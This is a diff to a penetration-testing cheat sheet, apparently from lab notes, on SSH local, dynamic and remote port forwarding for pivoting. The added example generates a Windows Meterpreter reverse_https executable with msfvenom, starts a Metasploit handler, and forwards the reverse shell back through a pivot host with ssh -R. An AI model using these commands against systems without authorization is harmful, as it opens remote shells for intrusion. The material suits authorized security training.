@@ -1,4 +1,4 @@
-### Local Port Forwarding
+#### Local Port Forwarding
 
 This setup creates a new port on your local machine (`[local_port]`), which forwards traffic to a specific destination on the remote machine (`[target_ip]:[target_port]`). If a service is accessible remotely on a particular IP and port, local port forwarding allows you to access it through your machine's port.
 
@@ -30,7 +30,7 @@ Example:
 ssh -L [local_port]:[target_ip]:[target_port] -L [local_port]:[target_ip]:[target_port] [user]@[target]
 ```
 
-### Dynamic Port Forwarding
+#### Dynamic Port Forwarding
 
 Useful when we don't know what port we need to connect to. To be used with `proxychains` or a `socks4/5` connection in a web browser. `socks4` only supports `TCP` whereas `sock5` supports both `TCP` and `UDP`.
 
@@ -80,3 +80,32 @@ From Attacker:
 ssh -R <PivotPointIP>:<port_to_listen_to_on_pivot_point>:0.0.0.0:<attacker_listen_port> ubuntu@<PivotPointIP> -vN
 ```
 
+Example:
+
+MSFVenom:
+
+- 172.16.8.120 - IP address of second interface on `Pivot Point` 
+- 443 - Port it listen on the `Pivot Point`
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.8.120 LPORT=443 -f exe > shell.exe
+```
+
+Metasploit:
+
+- 0.0.0.0 - All interfaces
+- 445 - Port open on `Attacker`
+
+```bash
+msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 0.0.0.0;set LPORT 445;run;"
+```
+
+SSH - From Attacker:
+
+- 172.16.8.120 - IP address of second interface on `Pivot Point`
+- 443 - Port it listen on the `Pivot Point`
+- 445 - Port to open on `Attacker`
+
+```bash
+ ssh -R 172.16.8.120:443:0.0.0.0:445 root@10.129.161.232
+```
